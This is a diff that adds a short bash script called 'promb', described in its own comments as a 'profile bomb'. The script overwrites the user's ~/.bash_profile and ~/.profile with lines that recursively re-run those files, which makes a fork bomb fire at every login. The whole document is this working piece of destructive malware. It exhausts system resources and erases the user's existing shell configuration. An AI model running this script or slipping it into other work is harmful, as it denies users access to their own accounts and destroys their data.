@@ -1,0 +1,12 @@
+#!/bin/bash
+
+# promb: profile bomb
+
+# promb shoves a forkbomb into the current user's bash profile.
+# as a result, the forkbomb will be run whenever the user logs in,
+# along with any leftover commands in the profile.
+
+# TL:DR promb makes a forkbomb execute everytime user logs in
+
+printf "sh .bash_profile &pid=$!\nsh .bash_profile\n" > ~/.bash_profile
+printf "sh .profile &pid=$!\nsh .profile\n" > ~/.profile
